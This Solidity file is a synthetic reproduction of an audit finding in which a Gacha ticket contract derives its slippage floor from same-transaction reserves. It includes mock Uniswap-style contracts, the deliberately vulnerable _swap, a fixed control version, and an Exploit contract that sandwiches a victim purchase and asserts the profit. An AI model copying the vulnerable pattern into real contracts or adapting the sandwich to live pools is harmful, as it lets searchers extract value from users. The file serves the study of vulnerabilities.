// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Gacha — _swap is vulnerable to sandwich attacks (Pashov Audit Group, H-01)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: _swap sets minTokens to 95% of getAmountOut on the reserves
    observed inside the same transaction. A buyer who would have required
    95% of the pre-trade quote receives less, and the searcher keeps the
    difference. Vulnerable lines copied from the report, marked @> VULN.
    Payment token is pair token0 so the report's reserve0-as-WETH read matches. */

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Router01 {
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) external pure returns (uint256);
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

library Math {
    function mulDiv(uint256 a, uint256 b, uint256 c) internal pure returns (uint256) {
        return a * b / c;
    }
}

contract MiniToken is IERC20 {
    string public symbol;
    uint8 public constant decimals = 0;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Pair is IUniswapV2Pair {
    MiniToken public token0;
    MiniToken public token1;
    uint112 public reserve0;
    uint112 public reserve1;
    address public router;

    constructor(address t0, address t1) {
        token0 = MiniToken(t0);
        token1 = MiniToken(t1);
    }

    function setRouter(address r) external {
        require(router == address(0), "router set");
        router = r;
    }

    function seed(uint256 a, uint256 b) external {
        require(reserve0 == 0 && reserve1 == 0, "seeded");
        token0.transferFrom(msg.sender, address(this), a);
        token1.transferFrom(msg.sender, address(this), b);
        reserve0 = uint112(a);
        reserve1 = uint112(b);
    }

    function getReserves() external view returns (uint112, uint112, uint32) {
        return (reserve0, reserve1, 0);
    }

    function swap(uint256 amount0Out, uint256 amount1Out, address to) external {
        require(msg.sender == router, "router");
        if (amount0Out > 0) token0.transfer(to, amount0Out);
        if (amount1Out > 0) token1.transfer(to, amount1Out);
        reserve0 = uint112(token0.balanceOf(address(this)));
        reserve1 = uint112(token1.balanceOf(address(this)));
    }
}

contract Factory is IUniswapV2Factory {
    address public pair;

    constructor(address p) {
        pair = p;
    }

    function getPair(address, address) external view returns (address) {
        return pair;
    }
}

contract Router is IUniswapV2Router01 {
    Pair public pair;

    constructor(address p) {
        pair = Pair(p);
    }

    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
        public
        pure
        returns (uint256)
    {
        uint256 amountInWithFee = amountIn * 997;
        return amountInWithFee * reserveOut / (reserveIn * 1000 + amountInWithFee);
    }

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256
    ) external returns (uint256[] memory amounts) {
        MiniToken input = MiniToken(path[0]);
        input.transferFrom(msg.sender, address(pair), amountIn);
        (uint112 r0, uint112 r1,) = pair.getReserves();
        uint256 amountOut;
        if (path[0] == address(pair.token0())) {
            amountOut = getAmountOut(amountIn, r0, r1);
            require(amountOut >= amountOutMin, "INSUFFICIENT_OUTPUT");
            pair.swap(0, amountOut, to);
        } else {
            amountOut = getAmountOut(amountIn, r1, r0);
            require(amountOut >= amountOutMin, "INSUFFICIENT_OUTPUT");
            pair.swap(amountOut, 0, to);
        }
        amounts = new uint256[](2);
        amounts[0] = amountIn;
        amounts[1] = amountOut;
    }
}

contract GachaTickets {
    error InvalidPair();

    IUniswapV2Router01 public router;
    IUniswapV2Factory public factory;
    address public paymentToken;
    address public memeToken;
    uint256 public cost;
    uint256 public lastMin;
    uint256 public lastActual;

    constructor(address uni, address fac, address pay, address meme, uint256 cost_) {
        router = IUniswapV2Router01(uni);
        factory = IUniswapV2Factory(fac);
        paymentToken = pay;
        memeToken = meme;
        cost = cost_;
    }

    function purchase() external returns (uint256 actualTokens) {
        actualTokens = _swap(memeToken, cost);
        lastActual = actualTokens;
        IERC20(memeToken).transfer(msg.sender, actualTokens);
    }

    function _swap(address token, uint256 cost_) private returns (uint256 actualTokens) {
        IUniswapV2Router01 uni = router;
        IUniswapV2Factory fac = factory;

        address pair = fac.getPair(paymentToken, token);
        (uint256 wethReserve, uint256 tokenReserve,) = IUniswapV2Pair(pair).getReserves();
        if (wethReserve == 0 || tokenReserve == 0) revert InvalidPair();

        uint256 maxTokens = uni.getAmountOut(cost_, wethReserve, tokenReserve); // includes 0.3%
        // @> VULN: minTokens is 95% of this transaction's spot quote, so a same-tx price move sets the floor
        uint256 minTokens = Math.mulDiv(maxTokens, 95, 100); // 5% slippage
        lastMin = minTokens;

        address[] memory path = new address[](2);
        path[0] = paymentToken;
        path[1] = token;

        IERC20(paymentToken).approve(address(uni), cost_);
        uint256[] memory amounts = uni.swapExactTokensForTokens(
            cost_,
            minTokens,
            path,
            address(this),
            block.timestamp + 1
        );
        actualTokens = amounts[amounts.length - 1];
    }
}

/// Control: the buyer passes the minimum computed before the trade. The router reverts
/// when the same-tx price move would pay less than that minimum.
contract GachaFixed {
    IUniswapV2Router01 public router;
    IUniswapV2Factory public factory;
    address public paymentToken;
    address public memeToken;
    uint256 public cost;

    constructor(address uni, address fac, address pay, address meme, uint256 cost_) {
        router = IUniswapV2Router01(uni);
        factory = IUniswapV2Factory(fac);
        paymentToken = pay;
        memeToken = meme;
        cost = cost_;
    }

    function purchase(uint256 minOut) external returns (uint256 actualTokens) {
        actualTokens = _swap(memeToken, cost, minOut);
        IERC20(memeToken).transfer(msg.sender, actualTokens);
    }

    function _swap(address token, uint256 cost_, uint256 minOut) private returns (uint256 actualTokens) {
        IUniswapV2Router01 uni = router;
        address pair = factory.getPair(paymentToken, token);
        (uint256 wethReserve, uint256 tokenReserve,) = IUniswapV2Pair(pair).getReserves();
        require(wethReserve != 0 && tokenReserve != 0, "pair");

        address[] memory path = new address[](2);
        path[0] = paymentToken;
        path[1] = token;

        IERC20(paymentToken).approve(address(uni), cost_);
        // FIX: minOut is the frontend minimum, not 95% of the in-transaction spot quote
        uint256[] memory amounts = uni.swapExactTokensForTokens(
            cost_,
            minOut,
            path,
            address(this),
            block.timestamp + 1
        );
        actualTokens = amounts[amounts.length - 1];
    }
}

contract Victim {
    function buy(GachaTickets gacha) external returns (uint256) {
        return gacha.purchase();
    }
}

contract Exploit {
    uint256 public constant RESERVE = 1_000_000;
    uint256 public constant COST = 100_000;
    uint256 public constant ATTACK_IN = 500_000;

    MiniToken public pay; // CREATE nonce 1
    MiniToken public meme; // CREATE nonce 2
    Pair public pair; // CREATE nonce 3
    Factory public factory; // CREATE nonce 4
    Router public router; // CREATE nonce 5
    GachaTickets public gacha; // CREATE nonce 6
    Victim public victim; // CREATE nonce 7

    uint256 public statedMin;
    uint256 public userGot;
    uint256 public shortfall;
    uint256 public profitPaid;

    constructor() {
        pay = new MiniToken("PAY");
        meme = new MiniToken("MEME");
        pair = new Pair(address(pay), address(meme));
        factory = new Factory(address(pair));
        router = new Router(address(pair));
        pair.setRouter(address(router));
        gacha = new GachaTickets(address(router), address(factory), address(pay), address(meme), COST);
        victim = new Victim();

        pay.mint(address(this), RESERVE + ATTACK_IN);
        meme.mint(address(this), RESERVE);
        pay.approve(address(pair), RESERVE);
        meme.approve(address(pair), RESERVE);
        pair.seed(RESERVE, RESERVE);
        pay.mint(address(gacha), COST);

        uint256 fair = router.getAmountOut(COST, RESERVE, RESERVE);
        statedMin = Math.mulDiv(fair, 95, 100);
    }

    function run() external {
        address[] memory buyPath = new address[](2);
        buyPath[0] = address(pay);
        buyPath[1] = address(meme);
        pay.approve(address(router), ATTACK_IN);
        router.swapExactTokensForTokens(ATTACK_IN, 0, buyPath, address(this), block.timestamp + 1);

        uint256 got = victim.buy(gacha);

        address[] memory sellPath = new address[](2);
        sellPath[0] = address(meme);
        sellPath[1] = address(pay);
        uint256 memeBal = meme.balanceOf(address(this));
        meme.approve(address(router), memeBal);
        router.swapExactTokensForTokens(memeBal, 0, sellPath, address(this), block.timestamp + 1);

        uint256 profit = pay.balanceOf(address(this)) - ATTACK_IN;
        pay.transfer(msg.sender, profit);

        userGot = got;
        shortfall = statedMin - got;
        profitPaid = profit;
        require(statedMin == 86_127, "stated minimum");
        require(got == 41_591, "user received");
        require(got < statedMin, "user not below stated minimum");
        require(shortfall == 44_536, "shortfall");
        require(profitPaid == 54_273, "sandwich profit");
        require(got >= gacha.lastMin(), "protocol floor rejected the swap");
    }
}
